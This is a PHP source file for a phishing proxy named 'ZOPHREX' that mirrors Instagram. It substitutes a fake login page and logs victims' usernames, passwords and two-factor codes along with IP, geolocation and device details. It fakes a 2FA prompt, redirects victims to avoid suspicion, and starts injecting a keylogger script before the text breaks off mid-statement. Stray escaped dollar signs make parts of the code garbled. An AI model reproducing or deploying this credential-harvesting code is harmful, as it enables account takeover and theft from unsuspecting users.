<?php
// ZOPHREX Advanced Transparent Proxy Server
// Instagram Credential Harvesting with Real-time Content Mirroring

session_start();

// Error reporting disabled for stealth
error_reporting(0);

// Configuration
\$instagram_domain = "www.instagram.com";
\$harvest_log = "logs/credentials.txt";
\$session_dir = "sessions/";
\$ssl_cert = "ssl/cert.pem";
\$ssl_key = "ssl/key.pem";

// Get client information
function getClientInfo() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $acceptLanguage = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
    $referer = isset($_SERVER['HTTP_REFERER']) ? \$_SERVER['HTTP_REFERER'] : 'Direct';
    
    // Get additional headers for device fingerprinting
    \$headers = array();
    foreach ($_SERVER as $key => \$value) {
        if (substr(\$key, 0, 5) == 'HTTP_') {
            \$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($key, 5)))))] = $value;
        }
    }
    
    // IP Geolocation
    $geoData = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
    
    // VPN/Proxy Detection
    $vpnCheck = json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=proxy,hosting"), true);
    $isVPN = $vpnCheck['proxy'] || \$vpnCheck['hosting'];
    
    return array(
        'ip' => \$ip,
        'userAgent' => \$userAgent,
        'acceptLanguage' => \$acceptLanguage,
        'referer' => \$referer,
        'headers' => \$headers,
        'timestamp' => date('Y-m-d H:i:s'),
        'geoData' => \$geoData,
        'isVPN' => \$isVPN
    );
}

// Check if this is a credential submission
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    \$clientInfo = getClientInfo();
    
    // Create session entry
    \$sessionId = session_id();
    $sessionFile = "{$session_dir}{\$sessionId}.json";
    
    // Check if 2FA is enabled
    $twoFactorCode = isset($_POST['verificationCode']) ? \$_POST['verificationCode'] : '';
    
    // Prepare data structure
    \$data = array(
        'sessionId' => \$sessionId,
        'credentials' => array(
            'username' => \$username,
            'password' => \$password,
            'twoFactorCode' => \$twoFactorCode
        ),
        'clientInfo' => \$clientInfo,
        'status' => 'captured'
    );
    
    // Save to session file
    file_put_contents($sessionFile, json_encode($data, JSON_PRETTY_PRINT));
    
    // Also append to main log
    $logEntry = "Session ID: {$sessionId}\n";
    $logEntry .= "Username: {$username}\n";
    $logEntry .= "Password: {$password}\n";
    if (!empty(\$twoFactorCode)) {
        $logEntry .= "2FA Code: {$twoFactorCode}\n";
    }
    $logEntry .= "IP: {$clientInfo['ip']}\n";
    $logEntry .= "Location: {$clientInfo['geoData']['city']}, {\$clientInfo['geoData']['country']}\n";
    $logEntry .= "Date: {$clientInfo['timestamp']}\n";
    $logEntry .= "User-Agent: {$clientInfo['userAgent']}\n";
    $logEntry .= "Referer: {$clientInfo['referer']}\n\n";
    
    file_put_contents($harvest_log, $logEntry, FILE_APPEND);
    
    // Determine redirect based on attack vector
    \$redirectUrl = 'https://www.instagram.com';
    
    // Check if we should show 2FA page
    if (empty(\$twoFactorCode) && rand(1, 100) <= 70) { // 70% chance to request 2FA
        $_SESSION['username'] = $username;
        $_SESSION['password'] = $password;
        $_SESSION['clientInfo'] = $clientInfo;
        
        // Load 2FA page
        header('Content-Type: text/html');
        readfile('templates/two_factor.html');
        exit();
    }
    
    // Redirect to Instagram to avoid suspicion
    header("Location: {\$redirectUrl}");
    exit();
}

// Handle 2FA submission
if (isset($_POST['verificationCode']) && isset($_SESSION['username'])) {
    $username = $_SESSION['username'];
    $password = $_SESSION['password'];
    $clientInfo = $_SESSION['clientInfo'];
    $twoFactorCode = $_POST['verificationCode'];
    
    // Create session entry
    \$sessionId = session_id();
    $sessionFile = "{$session_dir}{\$sessionId}.json";
    
    // Prepare data structure
    \$data = array(
        'sessionId' => \$sessionId,
        'credentials' => array(
            'username' => \$username,
            'password' => \$password,
            'twoFactorCode' => \$twoFactorCode
        ),
        'clientInfo' => \$clientInfo,
        'status' => 'captured'
    );
    
    // Save to session file
    file_put_contents($sessionFile, json_encode($data, JSON_PRETTY_PRINT));
    
    // Also append to main log
    $logEntry = "Session ID: {$sessionId}\n";
    $logEntry .= "Username: {$username}\n";
    $logEntry .= "Password: {$password}\n";
    $logEntry .= "2FA Code: {$twoFactorCode}\n";
    $logEntry .= "IP: {$clientInfo['ip']}\n";
    $logEntry .= "Location: {$clientInfo['geoData']['city']}, {\$clientInfo['geoData']['country']}\n";
    $logEntry .= "Date: {$clientInfo['timestamp']}\n";
    $logEntry .= "User-Agent: {$clientInfo['userAgent']}\n";
    $logEntry .= "Referer: {$clientInfo['referer']}\n\n";
    
    file_put_contents($harvest_log, $logEntry, FILE_APPEND);
    
    // Clear session
    unset(\$_SESSION['username']);
    unset(\$_SESSION['password']);
    unset(\$_SESSION['clientInfo']);
    
    // Redirect to Instagram to avoid suspicion
    header('Location: https://www.instagram.com');
    exit();
}

// Get the requested path
$requestPath = $_SERVER['REQUEST_URI'];
$parsedUrl = parse_url($requestPath);
$path = isset($parsedUrl['path']) ? \$parsedUrl['path'] : '/';
$query = isset($parsedUrl['query']) ? '?' . \$parsedUrl['query'] : '';

// Check if this is a request for Instagram login page
if ($path == '/accounts/login/' || $path == '/accounts/login/') {
    // Load our custom login page
    header('Content-Type: text/html');
    readfile('templates/login.html');
    exit();
}

// For all other requests, proxy to Instagram
// Set up cURL to fetch the actual Instagram content
\$ch = curl_init();
$url = "https://{$instagram_domain}{$path}{$query}";
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt(\$ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt(\$ch, CURLOPT_HEADER, true);
curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

// Forward all headers from the original request
foreach ($_SERVER as $key => \$value) {
    if (substr(\$key, 0, 5) == 'HTTP_') {
        \$headerName = str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr(\$key, 5)))));
        curl_setopt($ch, CURLOPT_HTTPHEADER, array($headerName . ': ' . \$value));
    }
}

// Execute the request
$response = curl_exec($ch);
$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$headers = substr($response, 0, \$headerSize);
$body = substr($response, \$headerSize);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close(\$ch);

// Process headers
$headerArray = explode("\r\n", $headers);
foreach (\$headerArray as \$header) {
    if (strpos(\$header, ':') !== false) {
        list(\$name, $value) = explode(':', $header, 2);
        $name = trim($name);
        $value = trim($value);
        
        // Skip certain headers that might cause issues
        if ($name != 'Transfer-Encoding' && $name != 'Content-Encoding') {
            header(\$name . ': ' . \$value);
        }
    }
}

// Set the HTTP status code
http_response_code(\$httpCode);

// Modify the HTML content to inject our keylogger if it's the main page
if ($path == '/' || $path == '/explore/' || \$path == '/accounts/activity/') {
    // Inject our keylogger script
    \$keyloggerScript = '<script id="zophrex-keylogger" src="keylogger.js"></script>';
    
    // Find the closing </body> tag and inject before it
    $body = str_replace('</body>', $keyloggerScript .

